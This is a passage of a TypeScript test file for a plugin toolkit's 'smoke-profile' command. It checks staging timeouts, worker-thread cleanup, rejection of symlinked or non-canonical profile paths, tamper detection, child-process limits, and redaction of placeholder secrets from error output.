      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
    })
    expect(JSON.parse(afterResult.stdout)).toMatchObject({
      issues: [{ message: 'smoke-profile budget exhausted after dump-config' }],
    })
  })

  it('returns a staging timeout before inspection when no budget remains', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-staging-timeout-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
    }))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['@deepseek-ai/dsh-toolkit'] } },
        profileRoot,
        timeLimitMs: 0,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
      })

      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        issues: [{ message: 'smoke-profile budget exhausted during staging' }],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('returns a staging timeout after artifact inspection consumes the remaining budget', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-staging-after-inspect-timeout-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
    }))
    const catalog = loadCuratedCatalog()
    const candidate = admittedCandidate('dsh-web-search-pro')
    stageCandidatePackage(profileRoot, 'dsh-web-search-pro', undefined, {}, undefined, candidate)
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({ ...catalog, candidates: [candidate] }),
      }
    })
    const commands = await import('../src/index.ts')
    const now = vi.spyOn(performance, 'now')
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(0)
      .mockReturnValueOnce(2)
      .mockReturnValue(2)
    let runnerCalls = 0
    try {
      const result = await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['dsh-web-search-pro'] } },
        profileRoot,
        timeLimitMs: 1,
        runner: async () => {
          runnerCalls += 1
          return { status: 0, stdout: '', stderr: '', durationMs: 0 }
        },
      })

      expect(runnerCalls).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        issues: [{ message: 'smoke-profile budget exhausted during staging' }],
      })
    } finally {
      now.mockRestore()
      rmSync(home, { recursive: true, force: true })
    }
  })

  it.skipIf(process.platform === 'win32')(
    'terminates blocked observed staging at the wall deadline without leaving a child',
    async () => {
      const home = mkdtempSync(join(tmpdir(), 'dsh-curated-blocked-staging-'))
      const profileRoot = join(home, 'profiles', 'web-curated')
      const manifestPath = join(profileRoot, 'package.json')
      const blockingWorker = join(profileRoot, 'blocking-worker.mjs')
      mkdirSync(profileRoot, { recursive: true })
      writeFileSync(manifestPath, JSON.stringify({
        name: 'dsh-profile-web-curated',
        dsh: { profile: { bundles: [] } },
      }))
      writeFileSync(blockingWorker, 'Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0)\n')
      try {
        const startedAt = performance.now()
        const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profileRoot,
          timeLimitMs: 50,
          stagingWorkerEntry: blockingWorker,
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
        })
        const elapsedMs = performance.now() - startedAt

        expect(elapsedMs).toBeLessThan(1_000)
        expect(JSON.parse(result.stdout)).toMatchObject({
          observed: true,
          issues: [{
            code: 'smoke-profile-command-timeout',
            message: 'smoke-profile budget exhausted during staging',
          }],
        })
        const followUp = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profileRoot,
          timeLimitMs: 500,
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
        })
        expect(followUp.status).toBe(1)
        expect(followUp.stdout).toContain('bundle list does not match the selected template')
      } finally {
        rmSync(home, { recursive: true, force: true })
      }
    },
    5_000,
  )

  it('awaits worker termination and reaches quiescence after every staging outcome', async () => {
    const constructorDelayMs = 60
    const schedulingToleranceMs = 25
    type WorkerMode = 'constructor-timeout' | 'timeout' | 'success' | 'error'
    class DelayedTerminationWorker extends EventEmitter {
      static readonly instances: DelayedTerminationWorker[] = []
      static readonly modes: WorkerMode[] = []
      readonly mode: WorkerMode
      referenced = true
      exited = false
      terminateCalls = 0
      resolveTermination!: (code: number) => void

      constructor() {
        super()
        const mode = DelayedTerminationWorker.modes.shift()
        if (mode === undefined) throw new Error('missing fake worker mode')
        this.mode = mode
        DelayedTerminationWorker.instances.push(this)
        if (mode === 'constructor-timeout') {
          Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, constructorDelayMs)
        }
        queueMicrotask(() => {
          if (mode === 'success') this.emit('message', { ok: true })
          if (mode === 'error') this.emit('error', new Error('worker fault'))
        })
      }

      unref(): this {
        this.referenced = false
        return this
      }

      terminate(): Promise<number> {
        this.terminateCalls += 1
        return new Promise<number>((resolveTermination) => {
          this.resolveTermination = (code) => {
            this.exited = true
            resolveTermination(code)
          }
        })
      }
    }

    const nativeSetTimeout = globalThis.setTimeout
    const nativeClearTimeout = globalThis.clearTimeout
    const activeTimers = new Set<NodeJS.Timeout>()
    const unhandled: unknown[] = []
    const onUnhandled = (reason: unknown): void => { unhandled.push(reason) }
    process.on('unhandledRejection', onUnhandled)
    vi.resetModules()
    vi.doMock('node:worker_threads', async () => ({
      ...await vi.importActual<typeof import('node:worker_threads')>('node:worker_threads'),
      Worker: DelayedTerminationWorker,
    }))
    vi.spyOn(globalThis, 'setTimeout').mockImplementation(((callback: () => void, delay?: number) => {
      const timer = nativeSetTimeout(() => {
        activeTimers.delete(timer)
        callback()
      }, delay)
      activeTimers.add(timer)
      return timer
    }))
    vi.spyOn(globalThis, 'clearTimeout').mockImplementation(((timer: NodeJS.Timeout) => {
      activeTimers.delete(timer)
      nativeClearTimeout(timer)
    }) as typeof clearTimeout)

    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-delayed-termination-'))
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      dsh: { profile: { bundles: [] } },
    }))
    try {
      const commands = await import('../src/index.ts')
      const invoke = async (mode: WorkerMode, timeLimitMs: number): Promise<CommandResult> => {
        DelayedTerminationWorker.modes.push(mode)
        let returned = false
        const pending = commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profileRoot,
          timeLimitMs,
          stagingWorkerEntry: new URL('file:///fixture-worker.mjs'),
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
        }).finally(() => {
          returned = true
        })
        await new Promise(resolve => nativeSetTimeout(resolve, mode === 'timeout' ? timeLimitMs + 5 : 5))
        const worker = DelayedTerminationWorker.instances.at(-1)
        expect(worker).toBeDefined()
        expect(worker?.terminateCalls).toBe(1)
        expect(returned).toBe(false)
        worker?.resolveTermination(0)
        return pending
      }

      const constructorStartedAt = performance.now()
      const constructorTimeoutResult = await invoke('constructor-timeout', 40)
      const constructorElapsedMs = performance.now() - constructorStartedAt
      expect(constructorElapsedMs).toBeGreaterThanOrEqual(constructorDelayMs)
      expect(constructorElapsedMs).toBeLessThan(constructorDelayMs + schedulingToleranceMs)
      expect(JSON.parse(constructorTimeoutResult.stdout)).toMatchObject({
        issues: [{ code: 'smoke-profile-command-timeout' }],
      })

      const startedAt = performance.now()
      const timeoutResult = await invoke('timeout', 20)
      expect(performance.now() - startedAt).toBeLessThan(200)
      expect(JSON.parse(timeoutResult.stdout)).toMatchObject({
        issues: [{ code: 'smoke-profile-command-timeout' }],
      })

      const successResult = await invoke('success', 200)
      expect(successResult.status).toBe(0)
      const errorResult = await invoke('error', 200)
      expect(errorResult.status).toBe(1)
      expect(errorResult.stdout).toContain('worker fault')

      for (const worker of DelayedTerminationWorker.instances) {
        expect(worker.referenced).toBe(false)
        expect(worker.exited).toBe(true)
        expect(worker.terminateCalls).toBe(1)
        expect(worker.eventNames()).toEqual([])
      }
      await new Promise(resolve => setImmediate(resolve))
      expect(activeTimers).toEqual(new Set())
      expect(unhandled).toEqual([])
    } finally {
      for (const worker of DelayedTerminationWorker.instances) {
        if (worker.terminateCalls > 0) worker.resolveTermination(0)
      }
      process.off('unhandledRejection', onUnhandled)
      vi.restoreAllMocks()
      vi.doUnmock('node:worker_threads')
      vi.resetModules()
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('runs production observed staging in the package worker', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-production-staging-worker-'))
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const result = await runSmokeProfile([
        '--profile',
        'web-personal',
        '--profile-root',
        profileRoot,
        '--json',
      ], {
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        ok: true,
        issues: [],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects production smoke through a symbolic-link profile ancestor', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-profile-root-symlink-'))
    const actualHome = join(root, 'actual-home')
    const linkedHome = join(root, 'linked-home')
    stageEmptyManagedPnpmEvidence(materializeCuratedProfile('web-personal', actualHome))
    symlinkSync(actualHome, linkedHome, process.platform === 'win32' ? 'junction' : 'dir')
    try {
      const result = await runSmokeProfile([
        '--profile',
        'web-personal',
        '--profile-root',
        join(linkedHome, 'profiles', 'web-personal'),
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'smoke-profile',
        ok: false,
        issues: [{
          code: 'smoke-profile-input-invalid',
          message: '--profile-root must not contain symbolic-link or junction components',
        }],
      })
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects a non-directory production profile path component', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-profile-file-'))
    const profilesRoot = join(home, 'profiles')
    writeFileSync(profilesRoot, 'not a directory')
    const profileRoot = join(profilesRoot, 'web-personal')
    try {
      const result = await runSmokeProfile([
        '--profile',
        'web-personal',
        '--profile-root',
        profileRoot,
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'smoke-profile-input-invalid',
          message: '--profile-root components must be directories',
        }],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects a production profile root outside canonical profiles/<profile>', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-production-profile-root-'))
    const profileRoot = join(home, 'other', 'web-personal')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-personal',
      dsh: { profile: { bundles: CURATED_PROFILE_TEMPLATES['web-personal'].bundles } },
    }))
    try {
      const result = await runSmokeProfile([
        '--profile',
        'web-personal',
        '--profile-root',
        profileRoot,
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        issues: [{
          code: 'smoke-profile-input-invalid',
          message: 'production observed smoke profile root must be $DSH_HOME/profiles/web-personal',
        }],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('returns serializable results from direct staging inspection', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-direct-staging-'))
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const input: SmokeProfileStagingInput = {
        profileRoot,
        profile: 'web-personal',
        bundles: CURATED_PROFILE_TEMPLATES['web-personal'].bundles,
        artifactRoots: [],
      }
      expect(inspectSmokeProfileStaging(input)).toEqual({ ok: true })
      expect(inspectSmokeProfileStaging({ ...input, bundles: [] })).toEqual({
        ok: false,
        error: 'installed profile web-personal bundle list does not match the selected template',
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('materializes a private execution home and rejects non-canonical managed profiles', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-direct-execution-home-'))
    const executionHome = mkdtempSync(join(tmpdir(), 'dsh-curated-direct-execution-target-'))
    const executionHomeWithoutPatch = mkdtempSync(join(tmpdir(), 'dsh-curated-direct-execution-no-patch-'))
    const invalidRoot = join(home, 'other', 'web-personal')
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      writeFileSync(join(home, 'cordis.patch.yml'), '- id: home-setting\n  config: {}\n')
      const input: SmokeProfileStagingInput = {
        profileRoot,
        profile: 'web-personal',
        bundles: CURATED_PROFILE_TEMPLATES['web-personal'].bundles,
        artifactRoots: [],
        executionHome,
      }

      expect(inspectSmokeProfileStaging(input)).toEqual({ ok: true })
      expect(readFileSync(join(executionHome, 'cordis.patch.yml'), 'utf8'))
        .toBe('- id: home-setting\n  config: {}\n')
      expect(readFileSync(join(executionHome, 'profiles/web-personal/package.json')))
        .toEqual(readFileSync(join(profileRoot, 'package.json')))

      rmSync(join(home, 'cordis.patch.yml'))
      expect(inspectSmokeProfileStaging({ ...input, executionHome: executionHomeWithoutPatch }))
        .toEqual({ ok: true })
      expect(existsSync(join(executionHomeWithoutPatch, 'cordis.patch.yml'))).toBe(false)

      mkdirSync(invalidRoot, { recursive: true })
      expect(inspectSmokeProfileStaging({ ...input, profileRoot: invalidRoot })).toEqual({
        ok: false,
        error: 'smoke execution staging requires a canonical managed profile',
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
      rmSync(executionHome, { recursive: true, force: true })
      rmSync(executionHomeWithoutPatch, { recursive: true, force: true })
    }
  })

  it('returns structured artifact issues from direct staging inspection', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-direct-staging-issue-'))
    const candidate = {
      ...admittedCandidate('dsh-web-search-pro'),
      runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
    }
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-web-curated',
        private: true,
        dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'dsh-web-search-pro',
        undefined,
        {},
        undefined,
        candidate,
      )
      writeFileSync(join(profileRoot, 'node_modules/dsh-web-search-pro/plugin.mjs'), 'tampered\n')
      const commands = await commandsWithCatalogCandidates([candidate])

      expect(commands.inspectSmokeProfileStaging({
        profileRoot,
        profile: 'web-curated',
        bundles: ['dsh-web-search-pro'],
        artifactRoots: [],
      })).toMatchObject({
        ok: false,
        issues: [expect.objectContaining({ code: 'artifact-tree-sha-mismatch' })],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'structured issue',
      body: 'parentPort.postMessage({ ok: false, issues: [{ code: "fixture", message: "worker issue", target: "worker" }] })',
      message: 'worker issue',
    },
    {
      name: 'reported error',
      body: 'parentPort.postMessage({ ok: false, error: "worker rejection" })',
      message: 'worker rejection',
    },
    {
      name: 'invalid result',
      body: 'parentPort.postMessage({ invalid: true })',
      message: 'staging worker returned an invalid result',
    },
    {
      name: 'success with extra fields',
      body: 'parentPort.postMessage({ ok: true, extra: true })',
      message: 'staging worker returned an invalid result',
    },
    {
      name: 'error with extra fields',
      body: 'parentPort.postMessage({ ok: false, error: "worker rejection", extra: true })',
      message: 'staging worker returned an invalid result',
    },
    {
      name: 'non-array issues',
      body: 'parentPort.postMessage({ ok: false, issues: "bad" })',
      message: 'staging worker returned an invalid result',
    },
    {
      name: 'malformed issue',
      body: 'parentPort.postMessage({ ok: false, issues: [{ code: 1, message: 2, target: 3 }] })',
      message: 'staging worker returned an invalid result',
    },
    {
      name: 'malformed issue target',
      body: 'parentPort.postMessage({ ok: false, issues: [{ code: "fixture", message: "bad target", target: 3 }] })',
      message: 'staging worker returned an invalid result',
    },
    {
      name: 'thrown error',
      body: 'throw new Error("worker fault")',
      message: 'worker fault',
    },
    {
      name: 'empty exit',
      body: 'process.exit(0)',
      message: 'staging worker exited with status 0',
    },
    {
      name: 'non-zero exit',
      body: 'process.exit(2)',
      message: 'staging worker exited with status 2',
    },
  ])('contains a staging worker $name', async ({ body, message }) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-staging-protocol-'))
    const workerPath = join(profileRoot, 'worker.mjs')
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      dsh: { profile: { bundles: [] } },
    }))
    writeFileSync(workerPath, `import { parentPort } from 'node:worker_threads'\n${body}\n`)
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        timeLimitMs: 1_000,
        stagingWorkerEntry: workerPath,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
      })

      expect(result.status).toBe(1)
      expect(result.stdout).toContain(message)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('runs the staging worker entry with and without a parent port', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-staging-entry-'))
    const profileRoot = materializeCuratedProfile('web-personal', home)
    stageEmptyManagedPnpmEvidence(profileRoot)
    const input: SmokeProfileStagingInput = {
      profileRoot,
      profile: 'web-personal',
      bundles: CURATED_PROFILE_TEMPLATES['web-personal'].bundles,
      artifactRoots: [],
    }
    const posted = vi.fn()
    try {
      vi.resetModules()
      vi.doMock('node:worker_threads', async () => ({
        ...await vi.importActual<typeof import('node:worker_threads')>('node:worker_threads'),
        parentPort: null,
        workerData: input,
      }))
      await expect(import('../src/staging-worker.ts')).rejects.toThrow(
        'smoke-profile staging worker requires a parent port',
      )

      vi.resetModules()
      vi.doMock('node:worker_threads', async () => ({
        ...await vi.importActual<typeof import('node:worker_threads')>('node:worker_threads'),
        parentPort: { postMessage: posted },
        workerData: input,
      }))
      await import('../src/staging-worker.ts')
      expect(posted).toHaveBeenCalledWith({ ok: true })
    } finally {
      vi.doUnmock('node:worker_threads')
      vi.resetModules()
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('runs through the smoke-profile source-tree wrapper', () => {
    const result = runNode('smoke-profile.mjs', ['--profile', 'web-curated', '--json'])
    const payload = JSON.parse(result.stdout) as SmokeProfileReport

    expect(result.status).toBe(1)
    expect(payload).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      observed: false,
      profile: 'web-curated',
      issues: [{ code: 'smoke-profile-profile-root-required' }],
    })
  }, 20_000)

  it('runs production children from a validated private execution home', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-execution-home-'))
    let workerEntry: string | undefined
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const originalManifest = readFileSync(join(profileRoot, 'package.json'), 'utf8')
      workerEntry = tempFile('smoke-execution-worker.mjs', [
        'const { cpSync, mkdirSync, readFileSync, writeFileSync } = await import("node:fs")',
        'const { dirname, join } = await import("node:path")',
        'const { parentPort, workerData } = await import("node:worker_threads")',
        'const target = join(workerData.executionHome, "profiles", workerData.profile)',
        'mkdirSync(dirname(target), { recursive: true })',
        'cpSync(workerData.profileRoot, target, { recursive: true, dereference: false })',
        'writeFileSync(join(workerData.profileRoot, "package.json"), "mutated live profile\\n")',
        'parentPort.postMessage({ ok: readFileSync(join(target, "package.json"), "utf8") !== "mutated live profile\\n" })',
        '',
      ].join('\n'))
      const result = await runSmokeProfile([
        '--profile',
        'web-personal',
        '--profile-root',
        profileRoot,
        '--json',
      ], {
        stagingWorkerEntry: workerEntry,
      })
      const payload = JSON.parse(result.stdout) as SmokeProfileReport

      expect(result.status, result.stdout).toBe(0)
      expect(payload.stages).toEqual(expect.arrayContaining([
        expect.objectContaining({ name: 'dump-config', ok: true }),
        expect.objectContaining({ name: 'help', ok: true }),
      ]))
      expect(readFileSync(join(profileRoot, 'package.json'), 'utf8')).not.toBe(originalManifest)
    } finally {
      if (workerEntry !== undefined) cleanup(workerEntry)
      rmSync(home, { recursive: true, force: true })
    }
  }, 20_000)

  it('runs observed staging through the smoke-profile source-tree wrapper', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-source-wrapper-'))
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const result = runNode('smoke-profile.mjs', [
        '--profile',
        'web-personal',
        '--profile-root',
        profileRoot,
        '--json',
      ])
      const payload = JSON.parse(result.stdout) as SmokeProfileReport

      expect(result.status, result.stdout).toBe(0)
      expect(payload).toMatchObject({
        command: 'smoke-profile',
        ok: true,
        observed: true,
        profile: 'web-personal',
        issues: [],
        stages: [
          { name: 'staging', ok: true },
          { name: 'manifest', ok: true },
          { name: 'bundle-parse', ok: true },
          { name: 'dump-config', ok: true },
          { name: 'help', ok: true },
        ],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  }, 20_000)

  it('contains and redacts provider-interface faults while preserving single-plugin recovery', async () => {
    const harness = await bootCuratedBehaviorProfile()
    const cases = [
      ['search-timeout', 'dsh-web-search-pro'],
      ['provider-429', 'dsh-llm-fallbacks'],
      ['sqlite-lock', 'dsh-memento'],
      ['permission-denied-file', 'dsh-permission-rules'],
      ['offline-network', 'upstream-radar'],
      ['illegal-patch', 'fixture-illegal-patch'],
      ['initialization-exception', 'dsh-agent-team-gui'],
    ] as const
    try {
      for (const [fault, candidateId] of cases) {
        let events: readonly string[] = []
        const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profiles: {
            'web-curated': {
              bundles: [
                '@deepseek-ai/dsh-curated-base',
                '@deepseek-ai/dsh-curated-behavior-fixture',
              ],
            },
          },
          runner: async (request: SmokeProfileRunnerRequest) => {
            if (request.stage === 'help') {
              return { status: 0, stdout: 'help ok', stderr: '', durationMs: 1 }
            }
            const execution = await harness.fixture().run(fault)
            events = execution.events
            return {
              status: execution.result.isError ? 1 : 0,
              stdout: '',
              stderr: execution.result.content.map((block: CuratedFixtureContentBlock) => block.type === 'text' ? block.text : '').join('\n'),
              durationMs: 1,
            }
          },
        })

        const payload = JSON.parse(result.stdout) as SmokeProfileReport
        const failedStage = payload.stages.find(item => item.name === 'dump-config')
        expect(result.status).toBe(1)
        expect(payload.ok).toBe(false)
        expect(failedStage).toMatchObject({
          name: 'dump-config',
          ok: false,
          durationMs: 1,
          status: 1,
        })
        expect(failedStage?.error).toContain(`candidate ${candidateId}`)
        expect(failedStage?.error).toContain('stage')
        expect(failedStage?.error).toContain('[REDACTED]')
        expect(failedStage?.error).not.toContain('sk-')
        expect(events).toEqual(expect.arrayContaining(['tool/call', 'tool/result']))
        await expect(harness.fixture().run('success')).resolves.toMatchObject({
          result: { isError: false },
        })
      }
    } finally {
      await harness.ctx.fiber.dispose()
    }
  })

  it('fails closed on an illegal patch fixture without echoing secret material', () => {
    const path = tempFile('patch.yml', `- id: bad
  name: plugin-a
  config:
    apiKey: sk-illegal-patch-secret
    value: [unclosed
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        ok: boolean
        issues: Array<{ code: string; message: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.ok).toBe(false)
      expect(payload.issues).toHaveLength(1)
      expect(payload.issues[0]?.code).toBe('preflight-input-invalid')
      expect(payload.issues[0]?.message).toContain('curated patch cannot be loaded')
      expect(JSON.stringify(payload)).not.toContain('sk-illegal-patch-secret')
      expect(JSON.stringify(payload)).not.toContain('apiKey:')
    } finally {
      cleanup(path)
    }
  })

  it.each([
    ['literal block', ['apiKey: |-', '  FROZEN_SECRET_7b91', '  FROZEN_SECRET_8c02'], ['FROZEN_SECRET_7b91', 'FROZEN_SECRET_8c02']],
    ['folded block', ['apiKey: >', '  FROZEN_SECRET_9d13', '  FROZEN_SECRET_0e24'], ['FROZEN_SECRET_9d13', 'FROZEN_SECRET_0e24']],
    ['multiline quoted', ['apiKey: "FROZEN_SECRET_1f35', '  FROZEN_SECRET_2a46"'], ['FROZEN_SECRET_1f35', 'FROZEN_SECRET_2a46']],
  ])('redacts every indented %s continuation from smoke YAML diagnostics', async (_name, scalarLines, secrets) => {
    const source = [
      ...scalarLines,
      'broken: }',
    ].join('\n')
    let diagnostic = ''
    try {
      loadYaml(source)
    } catch (error) {
      diagnostic = String(error)
    }
    expect(diagnostic).toContain(secrets[0])
    expect(diagnostic).toContain(secrets[1])

    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async request => request.stage === 'dump-config'
        ? { status: 1, stdout: '', stderr: diagnostic, durationMs: 1 }
        : { status: 0, stdout: '', stderr: '', durationMs: 1 },
    })
    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    const error = payload.stages.find(stage => stage.name === 'dump-config')?.error ?? ''

    expect(result.status).toBe(1)
    expect(error).toContain('[REDACTED]')
    expect(error).toContain('broken: }')
    expect(error).toContain('^')
    for (const secret of secrets) {
      expect(error).not.toContain(secret)
      expect(result.stdout).not.toContain(secret)
    }
  })

  it('preserves blank code-frame lines without ending YAML secret block redaction', async () => {
    const secret = 'FROZEN_SECRET_AFTER_BLANK_3b57'
    const source = [
      'apiKey: |-',
      '',
      `  ${secret}`,
      'publicContext: }',
    ].join('\n')
    let diagnostic = ''
    try {
      loadYaml(source)
    } catch (error) {
      diagnostic = String(error)
    }
    expect(diagnostic).toContain(secret)

    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async request => request.stage === 'dump-config'
        ? { status: 1, stdout: '', stderr: diagnostic, durationMs: 1 }
        : { status: 0, stdout: '', stderr: '', durationMs: 1 },
    })
    const error = (JSON.parse(result.stdout) as SmokeProfileReport)
      .stages.find(stage => stage.name === 'dump-config')?.error ?? ''

    expect(result.status).toBe(1)
    expect(error).toContain('\n 2 | \n')
    expect(error).toContain('[REDACTED]')
    expect(error).toContain('publicContext: }')
    expect(error).toContain('^')
    expect(error).not.toContain(secret)
    expect(result.stdout).not.toContain(secret)
  })

  it('reports argument parsing failures from smoke-profile as JSON', async () => {
    const result = await runSmokeProfile(['--profile', '', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-input-invalid', message: '--profile requires a value' }],
    })
  })

  it('rejects empty --profile= values after argument parsing', async () => {
    const result = await runSmokeProfile(['--profile=', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-input-invalid', message: 'profile must be a non-empty string' }],
    })
  })

  it('captures real child runner output, failures, and timeouts', async () => {
    const echoRunner = createSmokeProfileChildRunner('/bin/echo')
    const bundles = ['@deepseek-ai/dsh-base']
    const dumpConfig = await echoRunner({ stage: 'dump-config', profile: 'web-curated', bundles, timeoutMs: 5000 })
    const help = await echoRunner({ stage: 'help', profile: 'web-curated', bundles, timeoutMs: 5000 })
    const missing = await createSmokeProfileChildRunner('/definitely/missing/dsh')({
      stage: 'help',
      profile: 'web-curated',
      bundles,
      timeoutMs: 5000,
    })
    const timeoutRunner = createSmokeProfileChildRunner(process.execPath, ['-e', 'setTimeout(() => {}, 50)'])
    const timedOut = await timeoutRunner({ stage: 'help', profile: 'web-curated', bundles, timeoutMs: 1 })

    expect(dumpConfig.status).toBe(0)
    expect(dumpConfig.stdout).toContain('--dump-config')
    expect(help.status).toBe(0)
    expect(help.stdout).toContain('--profile web-curated --help')
    expect(missing.status).toBe(1)
    expect(timedOut.status).toBe(124)
    expect(timedOut.timedOut).toBe(true)
  })

  it.skipIf(process.platform === 'win32')(
    'allows an exact-limit child result and bounds secret-assignment redaction expansion',
    async () => {
      const limit = 1024 * 1024
      const request: SmokeProfileRunnerRequest = {
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      }
      const exact = await createSmokeProfileChildRunner(process.execPath, [
        '-e',
        `process.stdout.write("x".repeat(${String(limit)}))`,
        '--',
      ])(request)

      expect(exact.status).toBe(0)
      expect(Buffer.byteLength(exact.stdout) + Buffer.byteLength(exact.stderr)).toBe(limit)

      const assignment = 'token=x\n'
      const repetitionsPerStream = limit / Buffer.byteLength(assignment) / 2
      const expanded = await createSmokeProfileChildRunner(process.execPath, [
        '-e',
        [
          `const output = ${JSON.stringify(assignment)}.repeat(${String(repetitionsPerStream)})`,
          'process.stdout.write(output)',
          'process.stderr.write(output)',
        ].join(';'),
        '--',
      ])(request)
      const expandedBytes = Buffer.byteLength(expanded.stdout) + Buffer.byteLength(expanded.stderr)

      expect.soft(expanded.status).toBe(1)
      expect.soft(expandedBytes).toBeLessThanOrEqual(limit)
      expect(expanded.stdout === '').toBe(true)
      expect(
        expanded.stderr === 'smoke-profile child stdout output exceeded 1048576-byte capture limit',
      ).toBe(true)
      expect(expanded.stderr).not.toContain('token=')
    },
  )

  it.skipIf(process.platform === 'win32')('normalizes a signal-killed child to status one', async () => {
    const runner = createSmokeProfileChildRunner(process.execPath, [
      '-e',
      'process.kill(process.pid, "SIGTERM")',
      '--',
    ])
    const result = await runner({
      stage: 'help',
      profile: 'web-curated',
      bundles: ['@deepseek-ai/dsh-base'],
      timeoutMs: 5000,
    })

    expect(result).toMatchObject({ status: 1 })
